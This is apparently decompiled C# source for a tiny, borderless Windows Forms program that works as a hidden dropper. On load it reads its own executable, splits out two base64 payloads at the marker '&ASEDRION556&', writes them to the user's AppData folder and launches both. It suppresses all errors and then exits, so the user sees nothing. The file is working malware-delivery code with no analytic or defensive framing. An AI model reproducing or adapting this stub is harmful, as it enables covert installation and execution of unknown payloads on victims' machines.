using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace F_B;

public class Form1 : Form
{
	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = File.ReadAllText(Application.get_ExecutablePath());
			string[] separator = new string[1] { "&ASEDRION556&" };
			string[] array = text.Split(separator, StringSplitOptions.None);
			byte[] bytes = Convert.FromBase64String(array[1]);
			byte[] bytes2 = Convert.FromBase64String(array[3]);
			string text2 = "\\";
			File.WriteAllBytes(folderPath + text2 + array[2], bytes);
			File.WriteAllBytes(folderPath + text2 + array[4], bytes2);
			string fileName = folderPath + text2 + array[2];
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = fileName;
			Process.Start(fileName);
			string fileName2 = folderPath + text2 + array[4];
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = fileName2;
			Process.Start(fileName2);
		}
		catch
		{
		}
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
